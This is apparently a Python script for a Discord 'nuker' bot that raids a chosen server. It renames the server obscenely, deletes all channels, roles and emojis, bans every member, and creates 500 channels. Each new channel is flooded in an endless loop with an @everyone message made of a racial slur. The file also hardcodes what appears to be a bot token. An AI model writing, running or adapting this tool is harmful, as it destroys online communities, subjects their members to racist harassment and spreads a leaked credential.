import discord, random
from discord.ext import commands

prefix = ">"
intents = discord.Intents(messages=True, members = True, guilds=True)
client = discord.Client(command_prefix=commands.when_mentioned_or(prefix), intents=intents)

SPAM_CHANNEL =  ["Chupapi runs you", "Chupapi","Chupapi Beamed You","Beamed by chupapi"]
SPAM_MESSAGE = ["@everyone nigger nigger nigger nigger nigger "]

server_id = int(input('Enter server ID to nuke: '))
ban_reason = input('Enter ban reason: ')

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    print(f"username: {client.user.name}")
    print(f"id: {client.user.id}")
    print(f"invite: https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot%20applications.commands")
    print('===============================================')
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f">setup | 1653 servers"))

    for guild in client.guilds:
        if guild.id == server_id:
            try:
              await guild.edit(name="FUCKED BY CHUPAPI MUNYANYO!")
              print("Server name has been changed...")
            except:
              print("Server name could not be changed...")

            for channel in guild.channels:
              try:
                await channel.delete()
                print (f"Deleted channel {channel.name}")
              except:
                print (f"Cannot delete channel {channel.name}")

            for role in guild.roles:
              try:
                await role.delete()
                print (f"Deleted role {role.name}")
              except:
                print (f"Cannot delete role {role.name}")

            for member in guild.members:
              try:
                await member.ban(reason=ban_reason)
                print (f"Banned {member.name}")
              except:
                  print (f"Cannot ban {member.name}")

            for emoji in guild.emojis:
              try:
                await emoji.delete()
                print (f"Emoji deleted {emoji.name}")
              except:
                print (f"Cannot delete emoji {emoji.name}")

            for i in range(500):
              await guild.create_text_channel(random.choice(SPAM_CHANNEL))

            print(f"nuked {guild.name} Successfully.")
            break
        else:
            print('Bot is not in the server provided!')
      
    print(f"nuked {guild.name} Successfully.")  

@client.event
async def on_guild_channel_create(channel):
    while True:
      await channel.send(random.choice(SPAM_MESSAGE))

client.run("ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.Y4jQFYHfv2IntQ3re8h64U4JqpY", bot=True)
